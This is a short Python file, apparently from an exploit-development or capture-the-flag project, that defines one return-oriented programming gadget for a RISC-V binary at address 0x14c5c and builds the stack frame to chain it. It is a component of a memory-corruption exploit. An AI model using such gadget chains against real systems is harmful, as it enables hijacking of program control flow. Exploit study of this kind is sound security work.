from bf_parser.rop_gadgets_base_class import ROP_Gadget

class MOVA0_A4(ROP_Gadget):
    '''
    ld ra, 0x38(sp)
    ld s0, 0x30(sp)
    ld s1, 0x28(sp)
    ld s2, 0x20(sp)
    ld s3, 0x18(sp)
    mv a0, a4
    addi sp, sp, 0x40
    jr ra
    '''
    def __init__(self):
        super().__init__(0x14c5c, 0x40)

    def construct_frame(self, ra=0, s0=0, s1=0, s2=0, s3=0):
        data = [0, 0, 0, s3, s2, s1, s0, ra]
        self.set_stack_frame(data)
        return self.print_gadget()